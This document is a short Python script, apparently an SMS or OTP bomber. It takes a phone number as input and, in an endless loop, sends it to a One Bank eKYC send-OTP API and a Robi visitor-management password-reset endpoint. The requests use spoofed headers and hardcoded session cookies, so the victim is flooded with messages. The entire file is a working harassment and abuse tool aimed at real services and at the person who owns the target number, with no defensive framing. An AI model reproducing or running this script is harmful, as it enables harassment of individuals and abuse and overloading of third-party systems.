import requests
import json

number=input("Enter Number : ")
url="https://ekyc.onebank.com.bd/api/onebank/mfs-self/send-otp"


headers = {"user-agent":"Dart/2.13 (dart:io)",
"content-type":"application/x-www-form-urlencoded; charset=utf-8",
"accept-encoding":"gzip",
"host":"ekyc.onebank.com.bd"}


data="mobileNo="+number+"&operatorCode=18"
#2

url2="https://facility.robi.com.bd/visitor_mgt/forgot_password"

headers2={"Host":"facility.robi.com.bd",
"Connection":"keep-alive",
"Accept":"application/json, text/javascript, */*; q=0.01",
"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With":"XMLHttpRequest",
"User-Agent":"Mozilla/5.0 (Linux; Android 10; vivo 1804) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
"Origin":"https://facility.robi.com.bd",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://facility.robi.com.bd/visitor_mgt/login",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"en-US,en;q=0.9",
"Cookie":"qrbasedvisitormgt=2eb4d925f586baa06b15c10928cae3d3; BIGipServerpool_facility_robi_com_bd=!Nb0p4kEwHUTE6OD38fqIr7/bpSqP8zrE0lbsC+gi4oEJX0sa47OpVYIMhRGxX+fDqqBvwL5qA6P+8UM=; ci_session_qr_vms=fsrdacse7k38a7k3t1if1o6ps8achnpe; TS0106edfe=01c9bf80bb73bc2bef4cf43cb7146943bac2c0a59f1c7880c02d1c75168c8616f7e84fd7173e342539cb0f4c649d409b10ad255eac6f7f62ac51825968ef04abfe9b7a70acb0ac8d5d6e2f451520b755a5cff1b9df"}


data2="qrbasedvisitormgt=2eb4d925f586baa06b15c10928cae3d3&user_email_address="+number



while 1:
	try:
		x=requests.post(url, headers=headers, data=data)
		print(x.text)
	except:
		print("Server Down")
	try:
		resp=requests.post(url2, headers=headers2, data=data2)
		print(resp.text)
	except:
		print("Server 2 Down")
	
	